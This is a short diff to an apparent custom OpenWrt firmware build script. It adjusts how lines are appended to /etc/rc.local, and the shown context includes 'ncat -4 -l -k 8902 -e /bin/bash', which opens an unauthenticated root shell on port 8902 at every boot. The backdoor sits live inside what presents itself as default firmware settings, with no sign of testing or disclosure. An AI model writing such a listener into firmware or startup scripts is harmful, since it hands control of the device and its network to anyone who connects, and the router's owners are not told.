@@ -12,6 +12,9 @@ cat > files/xpc-default-settings << EOF_TOTAL
 sed -i "/DISTRIB_REVISION/s/'$/\ \(Compiled by Xpc0938 on ${DATE_T}\)'/g" /etc/openwrt_release
 
 # rc.local
+cat /etc/rc.local | grep -q "^which ncat"; ret="\$?"
+if [ "\$ret" != "0" ]; then
+
 sed -i '/exit 0/d' /etc/rc.local
 cat >> /etc/rc.local << EOF
 which ncat  > /dev/null 2>&1; ret="\\\$?"
@@ -22,6 +25,8 @@ ncat -4 -l -k 8902 -e /bin/bash &
 
 exit 0
 EOF
+
+fi
 
 rm -rf /tmp/luci-modulecache
 rm -f /tmp/luci-indexcache
